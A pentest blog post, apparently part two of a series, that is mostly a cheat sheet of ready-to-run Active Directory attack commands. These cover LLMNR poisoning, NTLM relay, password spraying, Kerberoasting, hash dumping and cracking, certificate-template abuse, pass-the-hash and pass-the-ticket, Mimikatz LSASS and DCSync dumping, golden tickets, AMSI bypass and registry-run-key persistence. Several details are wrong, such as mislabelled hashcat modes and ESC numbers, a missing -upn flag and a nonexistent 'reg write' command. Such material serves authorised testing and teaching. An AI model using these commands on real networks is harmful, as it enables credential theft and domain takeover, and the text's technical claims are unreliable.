---
title: "Active Directory Pentest -PART 2-"
author: F1Z3R
description: "Technical documentation of attack vectors, methodologies, and exploitation techniques."
date: 2025-11-10 11:00 +0100
categories : [Pentesting, Active Directory]
tags: [windows, active directory, smb, ntlm relay, responder, esc1, certificate abuse, password cracking, winrm]
img_path: /assets/img/posts/Active-Directory/imageAD.jpg
image:
    path: /assets/img/posts/Active-Directory/imageAD.jpg
---
# LMNR Poisoning :

**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** poisoning is a common attack vector in Windows environments that allows attackers to intercept and relay authentication attempts.

```bash
Responder responder -I eth0 -rdwv
```

# **SMB Relay :**

**SMB Relay** is a sophisticated attack that intercepts NTLM authentication attempts and "relays" them to other machines, rather than just capturing the hashes. This allows attackers to gain unauthorized access to systems without cracking passwords.

**Requirements**

1. **SMB Signing Disabled** on target machines
2. **NTLM Authentication** enabled
3. **Network Access** to target systems
4. **Ability to intercept** authentication attempts

Attack:

- http off smb off in responder.conf
- Responder :
    
    ```bash
    # Listner
    responder -I eth0 -rdwv
    
    #########################################################
    
    # Triger the hash
    ntlmrelayx.py -tf targets.txt -smb2support
    
    # With specific attacks
    ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
    
    # Dump SAM database
    ntlmrelayx.py -tf targets.txt -smb2support -e /path/to/malicious.exe
    
    # Interactive SMB shell
    ntlmrelayx.py -tf targets.txt -smb2support -i
    
    # Execute commands
    ntlmrelayx.py -tf targets.txt -smb2support -c "ipconfig"
    ```
    

# **Kerbrute :**

B**rute-force and enumeration attacks against Microsoft Active Directory** using the Kerberos protocol . 
If the username **exists**, the Domain Controller will respond with a `PRINCIPAL UNKNOWN` error. Kerbrute interprets this as a valid user.

```bash
#userenum
kerbrute userenum -t 1000 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.90 -d domain.com 
#user bruteforce with known password
kerbrute passwordspray -t 250 --dc 10.10.11.90 -d domain.tld users.txt Password@1
#password bruteforce with known username
kerbrute bruteuser -t 250 --dc 192.168.1.19 -d domain.tld password.txt admin 
```

# **GetUserSPN :**

used to **query an Active Directory domain for user accounts that have Service Principal Names (SPNs) registered**.

```bash
GetUserSPNs.py domain.com/username:password -dc-ip 10.10.11.90-request
```

# **TargetedKerberoast**

**automates the discovery and roasting of service accounts that do not have a complex password policy applied**, specifically targeting accounts that are exempt from the default **Kerberos AES encryption** requirement.

link: **https://github.com/ShutdownRepo/targetedKerberoast**

```bash
usage: targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]

python3 targetedKerberoast.py -v -d 'domain.com' -u username -p password

```

# **GetTGT :**

**Request a Ticket-Granting-Ticket (TGT) from a Domain Controller**

```bash
GetTGT.py domain.com/USERNAME:'PASSWORD' -dc-ip DC.domain.com
```

# **Secretsdump :**

**Extract password hashes and other secrets from a remote Windows machine or a local system**.

```bash
secretsdump.py domain/user:password@192.168.0.101
```

## **Hashdump :**

```bash
**reg save HKLM\SAM C:\Users\<YourUser>\Desktop\SAM.hiv
 reg save HKLM\SYSTEM C:\Users\<YourUser>\Desktop\SYSTEM.hiv
 secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL**
```

# **Hashcat :**

```bash
# ntlm hash crack
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O 
# sam hash crack
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -O 
# login token crack krbtgt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O 
# kerberoas Aspreroast
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -O 
# hashcat sntp crack
hashcat -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt -O
```

# Certipy :

Enumerate, attack, and abuse misconfigurations in Microsoft's Active Directory Certificate Services (AD CS). It essentially allows an attacker to find and exploit ways to impersonate users and computers by forging certificates.

```bash
## Find Vulnerable Certificate Templates
certipy find -u <user> -p <pass> -dc-ip <ip>
## Request a Certificate (ESC1)
certipy req -u <user> -p <pass> -ca <ca-name> -template <template-name> -dc-ip <ip>
## Authenticate Using a Certificate
certipy auth -pfx <cert.pfx> -dc-ip <ip>
## Request Certificate for Another User (ESC6)
certipy req -u <user> -p <pass> -ca <ca-name> -template <template> -upn <target@domain> -dc-ip <ip>
## List Certificate Authorities
certipy ca -u <user> -p <pass> -dc-ip <ip>
## Extract Certificate Information from .pfx
certipy cert -pfx <cert.pfx>
## Get TGT Using Certificate (PKINIT)
certipy auth -pfx <cert.pfx> -dc-ip <ip> --get-tgt
## Get TGT (Alternative PKINIT for ESC8)
certipy auth -pfx <cert.pfx> -dc-ip <ip> --alt --get-tgt
## Shadow Credentials (ESC8)
certipy shadow -u <user> -p <pass> -target <target-user> -dc-ip <ip>
## Dump Certificate Data from Target User
certipy dump -u <user> -p <pass> -target <target-user> -dc-ip <ip>
##  Convert .pfx to .pem or Extract Cert Only
certipy cert -pfx <cert.pfx> -nokeys -out cert.pem
```

## **Scenario ESC1**

 A certificate template allows low-privileged users to specify custom Subject Alternative Names (SAN), enabling impersonation of any user.

```
# Step 1: Discover vulnerable certificate templates
certipy find -u 'user' -p 'pass' -dc-ip 10.0.0.1

# Step 2: Request certificate with Domain Admin privileges
certipy req -u 'user' -p 'pass' -ca 'dc01-CA' -template 'User' -dc-ip 10.0.0.1

# Step 3: Authenticate with the certificate to get Kerberos TGT
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 --get-tgt
```

## **Scenario ESC6**

The Certificate Authority has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled, making ALL templates vulnerable to SAN manipulation.

```
# Step 1: Directly request certificate for Domain Administrator
certipy req -u 'user' -p 'pass' -ca 'dc01-CA' -template 'ESC6Template' -upn 'Administrator@domain.local' -dc-ip 10.0.0.1

# Step 2: Authenticate as Domain Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 --get-tgt
```

## **Scenario SC8**

Write permissions on a target account allow adding Key Credentials for PKINIT authentication.

```
# Step 1: Add shadow credentials to target account
certipy shadow -u 'user' -p 'pass' -target 'Administrator' -dc-ip 10.0.0.1

# Step 2: Authenticate using PKINIT with the new credentials
certipy auth -pfx administrator_shadow.pfx -dc-ip 10.0.0.1 --alt --get-tgt
```

# **Rubeus :**

Rubeus is a powerful C# toolset for raw Kerberos interaction and abuse, part of the GhostPack suite. It's the go-to tool for Kerberos-based attacks in Active Directory environments.

### **1. Request TGT (Ticket-Granting-Ticket)**

```
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
```

**Purpose:** Requests a Kerberos TGT using an NTLM hash (Pass-the-Hash)

**Use Case:** Gain initial Kerberos authentication without knowing the plaintext password

### **2. Request TGS (Service Ticket)**

```
Rubeus.exe asktgs /ticket:BASE64_TICKET /service:SERVICE/HOST.DOMAIN [/user:USERNAME] [/rc4:HASH]
```

**Purpose:** Requests a service ticket for a specific SPN using an existing TGT

**Use Case:** Access specific services like SQL, HTTP, or file shares

### **3. Kerberoasting**

```
# Basic Kerberoasting
Rubeus.exe kerberoast

# Target specific users
Rubeus.exe kerberoast /user:SQLService

# Output in Hashcat format
Rubeus.exe kerberoast /format:hashcat

# Stealthy - use existing TGT from cache
Rubeus.exe kerberoast /usetgtdeleg
```

**Purpose:** Extract service account hashes from Kerberos service tickets

**Use Case:** Crack service account passwords offline

### **4. Pass-the-Ticket**

```
Rubeus.exe ptt /ticket:BASE64_TICKET_OR_FILE
```

**Purpose:** Injects a Kerberos ticket into the current session

**Use Case:** Assume the identity of a user without their credentials

### **5. Overpass-the-Hash**

```
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /ptt
```

**Purpose:** Requests a TGT with a hash and automatically injects it

**Use Case:** Upgrade from hash to full Kerberos authentication

### **6. Ticket Renewal**

```
Rubeus.exe renew /ticket:BASE64_TICKET
```

**Purpose:** Extends the lifetime of an existing TGT

**Use Case:** Maintain persistent access with expiring tickets

### **7. S4U (Service-for-User) Delegation**

```
# S4U2Self + S4U2Proxy
Rubeus.exe s4u /ticket:BASE64_TICKET /impersonateuser:DOMAIN_ADMIN /msdsspn:SERVICE/HOST /altservice:SERVICE

# Full S4U attack chain
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_HASH /impersonateuser:Administrator /msdsspn:HOST/DC.domain.local /altservice:cifs
```

**Purpose:** Performs constrained delegation attacks to impersonate users

**Use Case:** Escalate privileges through misconfigureled service accounts

### **8. Ticket Extraction & Management**

```
# Dump all current tickets
Rubeus.exe dump

# Dump and save specific user tickets
Rubeus.exe dump /user:USERNAME /service:SERVICE

# Purge tickets from memory
Rubeus.exe purge
```

# **Evil-WinRM**

**Evil-WinRM** is the Swiss Army knife for Windows remote administration and penetration testing, providing PowerShell remoting (WinRM) capabilities with extensive offensive security features.

### **1. Pass-the-Hash Attack**

```
evil-winrm -i 10.10.10.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**Purpose:** Authenticate using NTLM hash without knowing plaintext password

**Use Case:** Lateral movement when you have hash dumps from tools like secretsdump.py

### **2. Basic Password Authentication**

```
evil-winrm -i dc.company.local -u Administrator -p 'P@ssw0rd123!'
```

**Purpose:** Standard username/password authentication

**Use Case:** Initial access with compromised credentials

### **3. Kerberos Authentication**

```
evil-winrm -i dc.company.local -u Administrator -r COMPANY.LOCAL -k
```

**Purpose:** Use Kerberos tickets for authentication

**Use Case:** Domain environments with Kerberos configured

**Prerequisite:** Valid Kerberos TGT in cache

### **4. Custom Port Specification**

```
evil-winrm -i 10.10.10.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:579da6cfb87c2b9a6bca0d4ad5c2a01b -p 5986 -S
```

**Purpose:** Connect to non-standard WinRM ports (5985/HTTP, 5986/HTTPS)

**Use Case:** Environments with customized WinRM configurations

**Note:** `-S` enables SSL for port 5986

## **Advanced Features & Scenarios**

### **5. Proxy Support for Pivoting**

```bash
evil-winrm -i internal.target -u Admin -H NTLM_HASH --proxy http://proxy.corp.com:8080
```

**Purpose:** Route connections through HTTP proxies

**Use Case:** Pivoting through compromised systems or corporate proxies

### **6. Script Loading & Execution**

```bash
# Load PowerShell scripts from local directory
evil-winrm -i 10.10.10.10 -u Admin -p 'password' -s /opt/scripts/

# Execute PS1 script on connection
evil-winrm -i 10.10.10.10 -u Admin -p 'password' -e /opt/scripts/privesc.ps1
```

**Purpose:** Automate post-exploitation tasks

**Use Case:** Load PowerView, SharpHound, or custom privesc scripts

### **7. On-Connect Script Execution**

```bash
evil-winrm -i 10.10.10.10 -u Admin -H NTLM_HASH -e /opt/scripts/get-process.ps1
```

**Purpose:** Run PowerShell scripts immediately after connection

**Use Case:** Automated reconnaissance or persistence setup

### **8. Password Spraying/Brute Force**

```bash
evil-winrm -i 10.10.10.10 -u Administrator -P passwords.txt
```

**Purpose:** Test multiple passwords against a single account

**Use Case:** Password spraying attacks when lockout policies permit

**Warning:** Can trigger account lockouts!

### **9. Pass-the-Ticket with Kerberos**

```bash
# Set Kerberos ticket environment variable
export KRB5CCNAME=/tmp/administrator.ccache

# Connect using the ticket
evil-winrm -i dc.company.local -u Administrator -r COMPANY.LOCAL -k
```

**Purpose:** Use existing Kerberos tickets for authentication

**Use Case:** After obtaining TGT with Rubeus or gettgt

**Prerequisite:** Valid .ccache file from Kerberos tools

### **10. Custom Working Directory**

```bash
evil-winrm -i 10.10.10.10 -u Admin -p 'password' -c C:\Temp\
```

**Purpose:** Start session in specific directory

**Use Case:** Focus operations in specific locations like writable shares

## **Integrated Tool Features**

Once connected, Evil-WinRM provides built-in commands:

### **File Operations**

```bash
# Upload files
upload /local/path/file.exe C:\Users\Public\file.exe

# Download files
download C:\secrets.txt /tmp/secrets.txt

# List directory contents
ls
```

### **In-Memory Execution**

```bash
# Load .NET assemblies directly into memory
Invoke-Binary /opt/tools/Seatbelt.exe

# Execute PE files without touching disk
Invoke-Binary C:\Tools\mimikatz.exe
```

### **Built-in Privilege Escalation**

```bash
# Check for common privesc vectors
menu
# Then select privesc options from the menu
```

### **Persistence Mechanisms**

```bash
# Create scheduled tasks for persistence
schtask /create /tn "Maintenance" /tr "C:\Windows\System32\cmd.exe" /sc hourly

# Add registry run keys
reg write "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /d "C:\malware.exe"
```

## **Bypass Techniques**

### **Bypass Execution Policy**

```bash
evil-winrm -i 10.10.10.10 -u Admin -p 'password' -s /scripts/ -e bypass.ps1 -B
```

### **AMSI Bypass**

```bash
evil-winrm -i 10.10.10.10 -u Admin -p 'password' --bypass-amsi
```

# **Mimikatz :**

Mimikatz is the legendary Windows security tool that extracts passwords, hashes, PINs, and Kerberos tickets from memory.

## **Credential Dumping Techniques**

### **1. Dump SAM Database (Local Hashes)**

```bash
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

**Purpose:** Extract local user account hashes from Security Account Manager

**Use Case:** Get local administrator hashes for lateral movement

**Requirements:** Administrator privileges with debug rights

### **2. Extract LSA Secrets**

```bash
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" exit
```

**Purpose:** Retrieve cached domain credentials, service account passwords, and DPAPI keys

**Use Case:** Find domain credentials cached on workstations

### **3. DCSync Attack (Domain Compromise)**

```bash
# Dump specific user
mimikatz.exe "lsadump::dcsync /user:DOMAIN\Administrator" exit

# Dump all domain users
mimikatz.exe "lsadump::dcsync /all" exit

# Target specific DC
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:company.com /dc:DC01" exit
```

**Purpose:** Simulate domain controller replication to extract user hashes

**Use Case:** Domain-wide credential harvesting without touching DC

**Requirements:** Domain Admin or equivalent replication rights

### **4. Extract Logon Passwords from Memory**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Purpose:** Dump all credentials from LSASS memory

**Use Case:** Immediate credential access from logged-on users

## **Lateral Movement Attacks**

### **5. Pass-the-Hash**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:company.com /ntlm:64f12cddaa88057e06a81b54e73b949b" exit
```

**Purpose:** Authenticate as a user using their NTLM hash

**Use Case:** Lateral movement without password knowledge

### **6. Overpass-the-Hash**

```bash
mimikatz.exe "sekurlsa::pth /user:svc_sql /domain:company.com /rc4:aad3b435b51404eeaad3b435b51404ee" "kerberos::list" exit
```

**Purpose:** Convert NTLM hash to Kerberos ticket

**Use Case:** Upgrade to Kerberos authentication for stealthier movement

## **Kerberos Ticket Manipulation**

### **7. Ticket Management**

```bash
# Purge all tickets
mimikatz.exe "kerberos::purge" exit

# List current tickets
mimikatz.exe "kerberos::list" exit

# Pass-the-Ticket
mimikatz.exe "kerberos::ptt C:\temp\admin.kirbi" exit
```

**Purpose:** Manage Kerberos tickets for impersonation

### **8. Export Tickets to File**

```bash
mimikatz.exe "kerberos::list /export" exit
```

**Purpose:** Save tickets for later use or analysis

## **Golden & Silver Ticket Attacks**

### **9. Golden Ticket Attack**

```bash
mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:company.com /sid:S-1-5-21-... /krbtgt:a9b30e5b0dc865eadcea9411e4adea8d /id:500 /groups:512 /ptt" exit
```

**Purpose:** Create unlimited domain admin tickets

**Requirements:** krbtgt account NTLM hash

**Use Case:** Domain persistence and backdoor access

### **10. Silver Ticket Attack**

```bash
mimikatz.exe "kerberos::golden /user:ServiceAccount /domain:company.com /sid:S-1-5-21-... /target:WEB01.company.com /rc4:4d28cfc1f6a8aeb4d4f4aef9253273a0 /service:HTTP /ptt" exit
```

**Purpose:** Create service-specific tickets

**Requirements:** Service account NTLM hash

**Use Case:** Access specific services without domain authentication

## **Forensic & Offline Analysis**

### **11. Analyze Memory Dumps**

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

**Purpose:** Extract credentials from offline memory dumps

**Use Case:** Forensic analysis or evading AV/EDR

### **12. DPAPI Master Key Extraction**

```bash
mimikatz.exe "dpapi::masterkey /in:C:\Users\Admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\key" exit
```

**Purpose:** Decrypt Windows Data Protection API keys

**Use Case:** Access encrypted files and credentials

## **Defense Evasion**

### **13. Patch & Bypass AMSI**

```bash
mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" exit
```

**Purpose:** Bypass Anti-Malware Scan Interface and LSA protection

# Bloodhound :

### **1. SharpHound (C# Collector)**

```bash
# EXE version - Comprehensive collection
.\SharpHound.exe --CollectionMethod All --Domain company.com --LdapUsername user --LdapPassword pass --OutputDirectory C:\temp\

# Common collection methods
.\SharpHound.exe -c Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,Trusts -d company.com

# Stealthy collection
.\SharpHound.exe --CollectionMethod DCOnly --Domain company.com --Stealth
```

### **2. PowerShell SharpHound**

```bash
# Bypass execution policy and load
powershell -ExecutionPolicy Bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain company.com -ZipFileName bh_data.zip
```

### **3. BloodHound-Python**

```bash
# Python-based collector
bloodhound-python -u 'john.doe' -p 'P@ssw0rd123!' -d company.com -ns 10.10.10.10 -c All --zip

# With Kerberos authentication
bloodhound-python -k -d company.com -ns 10.10.10.10 -c All --zip

# Specific DC targeting
bloodhound-python -u user -p pass -d company.com -dc DC01.company.com -c Group,LocalAdmin --zip
```

### **4. Network Execution (nxc)**

```bash
# Using CrackMapExec/NetExec
nxc ldap 10.10.10.10 -d 'company.com' -u 'admin' -p 'Password123!' --bloodhound -c All --dns-tcp

# With hash authentication
nxc ldap 10.10.10.10 -d 'company.com' -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:579da6cfb87c2b9a6bca0d4ad5c2a01b' --bloodhound -c All

```

# **Common Penetration Testing Errors**

## **Kerberos Time Synchronization Issues**

### **Error: `KRB_AP_ERR_SKEW (Clock skew too great)`**

**Problem:** Kerberos requires time synchronization within 5 minutes between client and Domain Controller.

**Solution: Synchronize Time with Domain Controller**

```bash
# Install time synchronization tools
sudo apt update && sudo apt install ntpdate -y

# Sync time with Domain Controller (replace with actual DC IP)
sudo ntpdate 10.10.10.10
```

## **Evil-WinRM Connection Timeouts**

### **Error: `HTTPClient::ConnectTimeoutError (execution expired)`**

**Problem:** Network connectivity issues, firewall blocking, or service not running.

**Troubleshooting Steps:**

```bash
# 1. Verify target is reachable
ping 10.10.10.10

# 2. Check if WinRM port (5985/5986) is open
nmap -p 5985,5986 10.10.10.10

# 3. Test basic connectivity
telnet 10.10.10.10 5985

# 4. Check if WinRM service is running on target (if you have some access)
# On Windows target:
Get-Service WinRM

# 5. Try different authentication methods
evil-winrm -i 10.10.10.10 -u admin -p 'password' -S  # Try SSL
evil-winrm -i 10.10.10.10 -u admin -p 'password' -p 5986  # Specific port

# 6. Increase timeout (if network is slow)
evil-winrm -i 10.10.10.10 -u admin -p 'password' --timeout 30
```

## **Kerberos Package Installation**

### **Install Kerberos Client Utilities**

```bash
# Install krb5-user package
sudo apt update && sudo apt install krb5-user -y

# Additional useful Kerberos tools
sudo apt install krb5-config heimdal-clients -y

# For development (if needed)
sudo apt install libkrb5-dev -y
```

## **Manual Configuration:**

```bash
# Edit Kerberos configuration
sudo nano /etc/krb5.conf

# Add domain-specific settings
[realms]
    YOURDOMAIN.LOCAL = {
        kdc = dc.yourdomain.local
        admin_server = dc.yourdomain.local
        default_domain = yourdomain.local
    }

[domain_realm]
    .yourdomain.local = YOURDOMAIN.LOCAL
    yourdomain.local = YOURDOMAIN.LOCAL
```